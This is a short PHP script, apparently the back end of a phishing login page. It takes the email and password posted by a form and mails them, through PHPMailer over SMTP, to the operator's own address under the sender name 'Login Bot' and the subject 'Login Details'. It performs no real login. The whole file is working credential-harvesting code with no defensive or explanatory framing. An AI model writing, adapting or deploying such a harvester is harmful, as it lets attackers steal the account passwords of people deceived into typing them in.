<?php

require 'config.php';
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $mail = new PHPMailer(true);
    try {
        $mail->isSMTP();
        $mail->Host = SMTP_HOST;
        $mail->SMTPAuth = true;
        $mail->Username = SMTP_USER;
        $mail->Password = SMTP_PASS;
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = SMTP_PORT;

        $mail->setFrom(SMTP_USER, 'Login Bot');
        $mail->addAddress(SMTP_USER);

        $mail->isHTML(true);
        $mail->Subject = 'Login Details';
        $mail->Body = "Email: $email<br>Password: $password";
        $mail->AltBody = "Email: $email\nPassword: $password";

        $mail->send();
        echo 'Login info sent successfully.';
    } catch (Exception $e) {
        echo 'Error: ' . $mail->ErrorInfo;
    }
}
?>